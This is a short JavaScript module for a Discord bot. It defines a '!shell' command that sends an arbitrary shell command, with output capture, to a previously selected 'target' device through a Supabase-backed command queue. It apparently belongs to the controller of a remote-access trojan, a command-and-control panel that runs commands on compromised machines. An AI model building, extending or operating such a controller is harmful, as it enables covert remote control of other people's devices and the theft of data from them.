import { sendCommand, commandSentEmbed, errorEmbed } from './_utils.js'

export const name = 'shell'

export async function execute(message, args, { supabase, getTarget, truncate }) {
  const deviceId = getTarget(message.guild.id, message.author.id)
  if (!deviceId) {
    return message.reply({ embeds: [errorEmbed('No active target. Use !target first.')] })
  }

  const command = args.join(' ').trim()
  if (!command) {
    return message.reply('❌ Usage: `!shell <command>` or use the Shell button on !target')
  }

  await message.channel.sendTyping()
  const cmd = await sendCommand(supabase, deviceId, 'shell', {
    command,
    capture_output: true,
  })
  if (!cmd) return message.reply('❌ Failed.')
  await message.reply({ embeds: [commandSentEmbed(deviceId, `\`${truncate(command, 80)}\``, cmd.id)] })
}
